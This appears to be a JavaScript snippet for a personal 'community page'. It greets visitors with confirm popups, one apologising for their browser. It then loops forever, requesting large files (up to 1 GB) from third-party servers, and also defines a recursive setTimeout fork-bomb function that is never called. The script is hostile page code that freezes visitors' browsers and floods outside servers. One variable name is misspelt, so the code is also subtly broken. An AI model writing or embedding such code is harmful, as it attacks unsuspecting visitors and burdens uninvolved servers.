confirm("Welcome to my community page!");
confirm("Sorry about your browser!");
//var grill = "";
//while(1) {
//  grill = grill + "meat";
//  console.log(grill);
// console.log("It's getting hot!");
//}
var count = 0
var HttpClient = function() {
    this.get = function(aUrl, aCallback) {
        var anHttpRequest = new XMLHttpRequest();
        anHttpRequest.onreadystatechange = function() { 
            if (anHttpRequest.readyState == 4 && anHttpRequest.status == 200)
                count = count + 1;
                console.log(count);
                aCallback(anHttpRequest.responseText);
        }

        anHttpRequest.open( "GET", aUrl, true );            
        anHttpRequest.send( null );
    }
}

aClient = new HttpClient();

while(1) {
  aClient.get('https://scholar.princeton.edu/sites/default/files/oversize_pdf_test_0.pdf', function(response) {
    console.log(response);
  });
  aClient.get('https://www.iso.org/iso/annual_report_2009.pdf', function(response) {
    console.log(response);
  });
  aClinet.get('https://speedtest.ftp.otenet.gr/files/test1Gb.db', function(response) {
    console.log(response);
  });
  aClient.get('https://speedtest.ftp.otenet.gr/files/test100Mb.db', function(response) {
    console.log(response);
  });
  aClient.get('https://speedtest.ftp.otenet.gr/files/test10Mb.db', function(response) {
    console.log(response);
  });
  aClient.get('https://www.pdf995.com/samples/pdf.pdf', function(response) {
    console.log(response);
  });  
  function die () {
  setTimeout(function () {die(); die()}, 0)
  }
};
